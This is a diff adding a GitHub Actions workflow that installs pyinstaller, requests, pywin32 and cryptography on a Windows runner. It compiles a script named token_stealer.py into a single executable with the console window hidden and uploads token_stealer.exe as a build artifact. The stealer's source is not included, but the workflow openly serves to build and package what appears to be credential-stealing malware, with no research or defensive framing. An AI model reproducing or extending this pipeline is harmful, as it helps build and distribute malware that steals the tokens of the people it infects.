@@ -1,0 +1,16 @@
+name: build
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - run: pip install pyinstaller requests pywin32 cryptography
+      - run: pyinstaller --onefile --noconsole token_stealer.py
+      - uses: actions/upload-artifact@v4
+        with:
+          name: token_stealer-exe
+          path: dist/token_stealer.exe
